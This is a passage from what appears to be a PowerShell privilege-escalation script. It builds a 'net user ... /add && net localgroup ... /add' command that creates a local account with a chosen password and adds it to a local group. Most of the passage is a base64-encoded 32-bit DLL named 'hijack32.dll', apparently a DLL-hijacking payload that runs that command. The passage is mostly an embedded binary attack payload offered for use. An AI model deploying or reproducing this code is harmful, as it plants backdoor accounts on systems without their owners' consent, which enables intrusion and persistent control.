            # only adding a domain user to the local group, no user creation
            $BatCommand = "net localgroup $LocalGroup $UserNameToAdd /add"
        }
        else {
            # create a local user and add it to the local specified group
            $BatCommand = "net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
        }
    }

    # generate with base64 -w 0 hijack32.dll > hijack32.b64
    $DllBytes32 = "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